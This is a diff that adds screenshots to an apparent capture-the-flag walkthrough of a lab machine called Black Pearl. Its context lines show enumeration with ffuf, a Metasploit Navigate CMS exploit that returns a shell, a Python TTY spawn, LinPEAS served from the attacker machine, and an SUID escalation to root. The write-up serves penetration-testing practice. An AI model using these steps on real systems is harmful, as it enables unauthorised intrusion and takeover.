@@ -73,6 +73,8 @@ PORT   STATE SERVICE VERSION
 - DNS server running **BIND on port 53**
 - Web server running **nginx on port 80**
 
+<img width="1041" height="547" alt="image" src="https://github.com/user-attachments/assets/aee3fcbf-5f12-4c18-9286-ff117146377e" />
+
 ---
 
 # 2. Web Server Enumeration
@@ -83,6 +85,8 @@ Navigating to the web server returned the **default nginx landing page**:
 Welcome to nginx!
 ```
 
+<img width="1043" height="217" alt="image" src="https://github.com/user-attachments/assets/a911b66d-e875-4443-8f4d-208d3f457487" />
+
 Viewing the page source revealed a potential clue:
 
 ```
@@ -90,6 +94,8 @@ webmaster: alek@blackpearl.tcm
 ```
 
 This suggested the existence of a domain called **blackpearl.tcm**.
+
+<img width="929" height="738" alt="image" src="https://github.com/user-attachments/assets/6fc05ca1-53ec-494d-a67d-372272be5432" />
 
 ---
 
@@ -105,6 +111,8 @@ ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt:FUZZ -u htt
 
 A directory named **/secret** was discovered.
 
+<img width="1039" height="44" alt="image" src="https://github.com/user-attachments/assets/2b483a7b-4d82-405c-9f24-ad5cd9900d45" />
+
 Accessing this path downloaded a file containing the following message:
 
 ```
@@ -116,6 +124,8 @@ Just kidding... search somewhere else. Directory busting won't give anything.
 
 - Alek
 ```
+
+<img width="1037" height="175" alt="image" src="https://github.com/user-attachments/assets/6d61645f-6cb7-480b-9978-82c9c474fada" />
 
 This indicated that the attack path likely involved another service.
 
@@ -141,6 +151,8 @@ blackpearl.tcm
 
 This domain pointed to the target host.
 
+<img width="725" height="125" alt="image" src="https://github.com/user-attachments/assets/09914be4-6962-4faf-8c13-a27fd374f9a5" />
+
 ---
 
 # 5. Updating Local DNS Resolution
@@ -156,6 +168,8 @@ After updating the hosts file, navigating to the domain displayed a **PHP web ap
 ```
 http://blackpearl.tcm
 ```
+
+<img width="1043" height="454" alt="image" src="https://github.com/user-attachments/assets/7debfce1-e8e6-4cfb-ae5b-f3784201b6c2" />
 
 ---
 
@@ -182,6 +196,8 @@ http://blackpearl.tcm/navigate
 ```
 
 revealed a **Navigate CMS login page**.
+
+<img width="1039" height="445" alt="image" src="https://github.com/user-attachments/assets/afdc6a67-6b2f-4844-beda-22d879d6e24c" />
 
 ---
 
@@ -217,7 +233,11 @@ set VHOST blackpearl.tcm
 run
 ```
 
+<img width="1027" height="702" alt="image" src="https://github.com/user-attachments/assets/e469ecc3-97ec-41aa-a4e5-0d9975a5ada2" />
+
 The exploit successfully returned a shell on the target system.
+
+<img width="1043" height="346" alt="image" src="https://github.com/user-attachments/assets/99155aa2-bce4-41ab-92c2-e44addb5a1e3" />
 
 ---
 
@@ -227,6 +247,8 @@ The initial shell was limited, so a proper TTY shell was spawned.
 
 Python was already installed on the system.
 
+<img width="208" height="48" alt="image" src="https://github.com/user-attachments/assets/edb51dab-6809-4dd0-b76d-6b52caeefd67" />
+
 ### Command Used
 
 ```bash
@@ -234,6 +256,8 @@ python -c 'import pty; pty.spawn("/bin/bash")'
 ```
 
 This provided a fully interactive shell.
+
+<img width="615" height="126" alt="image" src="https://github.com/user-attachments/assets/ca754712-aa40-4e13-8130-ca3e2f873dac" />
 
 ---
 
@@ -248,6 +272,8 @@ On the attacker machine:
 ```bash
 python3 -m http.server 80
 ```
+
+<img width="693" height="281" alt="image" src="https://github.com/user-attachments/assets/ae56ec8f-d9b8-4645-b0f3-a211c4b4e20e" />
 
 ---
 
@@ -264,6 +290,8 @@ chmod +x linpeas.sh
 # 11. Identifying SUID Misconfiguration
 
 LinPEAS revealed several binaries with the **SUID bit set**.
+
+<img width="1032" height="503" alt="image" src="https://github.com/user-attachments/assets/21a71926-6f8a-44f5-8ad7-df024d2881ef" />
 
 One notable binary:
 
@@ -300,6 +328,8 @@ Executing the command spawned a shell with **root privileges**.
 ```
 uid=0(root) gid=0(root)
 ```
+
+<img width="927" height="117" alt="image" src="https://github.com/user-attachments/assets/d8c772d6-6d45-4802-b2ad-6f01d556721c" />
 
 This confirmed **full system compromise**.
 
